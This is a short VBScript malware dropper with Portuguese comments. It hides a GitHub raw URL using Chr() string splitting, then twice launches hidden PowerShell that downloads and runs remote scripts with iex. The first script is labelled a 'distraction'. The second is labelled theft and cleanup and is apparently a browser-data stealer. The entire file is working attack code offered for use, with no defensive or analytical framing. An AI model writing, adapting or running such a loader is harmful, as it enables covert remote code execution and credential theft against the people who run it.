' Ofuscação simples: divide strings e usa Chr()
Set shell = CreateObject("WScript.Shell")
Set http = CreateObject("MSXML2.ServerXMLHTTP")

baseUrl = "h" & Chr(116) & "t" & Chr(112) & "s://raw.githubusercontent.com/gsfv/tro.j/refs/heads/main/"

' 1. Distração
cmd = "powershell -NoP -W Hidden -C ""iex (iwr -Uri '" & baseUrl & "ANDRE.ps1' -UseBasicParsing).Content"""
shell.Run cmd, 0, False

WScript.Sleep 3000

' 2. Roubo + limpeza
cmd = "powershell -NoP -W Hidden -C ""iex (iwr -Uri '" & baseUrl & "BROWSER-ALL.ps1' -UseBasicParsing).Content"""
shell.Run cmd, 0, False
